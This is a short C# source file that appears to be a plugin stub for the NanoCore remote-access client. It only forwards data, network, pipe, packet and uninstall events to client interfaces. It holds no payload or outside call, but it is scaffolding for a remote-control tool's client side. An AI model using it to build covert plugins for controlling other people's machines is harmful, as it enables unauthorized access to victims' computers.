using System;
using NanoCore.ClientPlugin;

namespace stub
{
	class Plugin
	{
		public string Name;
		public Guid Guid;
		public IClientData ClientData;
		public IClientNetwork ClientNetwork;
		public IClientApp ClientApp;

		public Plugin(Guid guid, string name)
		{
			Guid = guid;
			Name = name;
		}

		public void VariableChanged(string str)
		{
			if (ClientData == null)
				return;

			ClientData.VariableChanged(str);
		}

		public void ClientSettingChanged(string str)
		{
			if (ClientData == null)
				return;

			ClientData.ClientSettingChanged(str);
		}

		public void BuildingHostCache()
		{
			if (ClientNetwork == null)
				return;

			ClientNetwork.BuildingHostCache();
		}

		public void ConnectionFailed(string host, ushort port)
		{
			if (ClientNetwork == null)
				return;

			ClientNetwork.ConnectionFailed(host, port);
		}

		public void ConnectionStateChanged(bool bool_0)
		{
			if (ClientNetwork == null)
				return;

			ClientNetwork.ConnectionStateChanged(bool_0);
		}

		public void PipeCreated(string string_1)
		{
			if (ClientNetwork == null)
				return;

			ClientNetwork.PipeCreated(string_1);
		}

		public void PipeClosed(string string_1)
		{
			if (ClientNetwork == null)
				return;

			ClientNetwork.PipeClosed(string_1);
		}

		public void ReadPacket(string string_1, object[] object_0)
		{
			if (ClientNetwork == null)
				return;

			ClientNetwork.ReadPacket(string_1, object_0);
		}

		public void PluginUninstalling()
		{
			if (ClientApp == null)
				return;

			ClientApp.PluginUninstalling();
		}

		public void ClientUninstalling()
		{
			if (ClientApp == null)
				return;

			ClientApp.ClientUninstalling();
		}
	}

	class PluginInfo
	{
		public DateTime DateTime;
		public string string_0;
		public Guid Guid;
		public bool bool_0;
		public byte[] byte_0;
		public byte[] byte_1;
		public Plugin Plugin;
	}
}